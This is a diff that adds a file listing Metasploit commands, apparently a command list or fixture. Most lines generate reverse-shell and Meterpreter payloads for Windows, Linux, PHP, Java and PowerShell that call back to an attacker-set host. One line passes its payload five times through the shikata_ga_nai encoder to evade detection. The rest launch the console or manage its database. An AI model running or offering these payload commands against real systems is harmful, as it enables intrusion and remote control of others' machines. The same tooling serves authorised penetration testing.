@@ -1,0 +1,19 @@
+msf
+msf -q
+msf -r /workspace/exploit.rc
+msfv -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f exe -o /workspace/payload.exe
+msfv -p linux/x86/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f elf -o /workspace/payload.elf
+msfv -p windows/x64/meterpreter/reverse_https LHOST="$LHOST" LPORT=443 -f exe -o /workspace/payload.exe
+msfv -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f powershell -o /workspace/payload.ps1
+msfv -p cmd/unix/reverse_bash LHOST="$LHOST" LPORT="$LPORT" -f raw
+msfv -p java/jsp_shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f war -o /workspace/shell.war
+msfv -p php/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f raw -o /workspace/shell.php
+msfv -p windows/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -e x86/shikata_ga_nai -i 5 -f exe -o /workspace/payload.exe
+msfv -l payloads
+msfv -l encoders
+msfv -l formats
+msfdb init
+msfdb start
+msfdb stop
+msfdb status
+msfdb reinit
